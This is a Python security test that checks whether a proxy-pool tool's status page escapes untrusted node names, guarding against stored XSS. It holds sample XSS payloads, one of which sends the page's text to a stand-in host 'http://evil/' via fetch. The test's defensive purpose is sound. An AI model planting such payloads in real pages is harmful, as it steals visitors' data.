#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Lead 独立复核: 状态页是否会渲染不可信节点名里的 HTML(存储型 XSS)。"""
import json
import sys

sys.path.insert(0, r"E:\AI\freeVPN")
import pool  # noqa: E402

EVIL = [
    '<img src=x onerror=alert(1)>',
    '<script>fetch("http://evil/"+document.body.innerText)</script>',
    '"><svg onload=alert(2)>',
    "香港</td><td colspan=99>injected",
]

rep = {
    "generated_at": "2026-01-01T00:00:00",
    "sources_ok": 1, "sources_total": 1, "after_dedupe": 4,
    "after_l1": 4, "after_l2": 4, "final": 4,
    "regions": {"HK": 4},
    "audit": {"blocked": 0, "warned": 0, "reasons": {}},
    "fastest": [
        {"name": n, "region": "HK", "type": "vmess", "tcp": 10, "real": 20}
        for n in EVIL
    ],
}

html = pool.render_page(rep, 8787, "TESTTOKEN", "")
print("=== 渲染结果里这些危险串是否原样出现 ===")
bad = 0
for s in EVIL:
    hit = s in html
    if hit:
        bad += 1
    print(f"  [{'!! 原样输出' if hit else 'ok 已被处理'}] {s[:52]!r}")

print()
print("=== 更实际的判定: 是否存在可执行的标签 ===")
import re
for tag in ("<script", "<img", "<svg", "onerror=", "onload="):
    n = len(re.findall(re.escape(tag), html, re.I))
    print(f"  {tag!r:12} 出现 {n} 次  {'<-- 可执行' if n else ''}")

print()
print(f"结论: {'存在 XSS' if bad else '未发现'}")
sys.exit(1 if bad else 0)
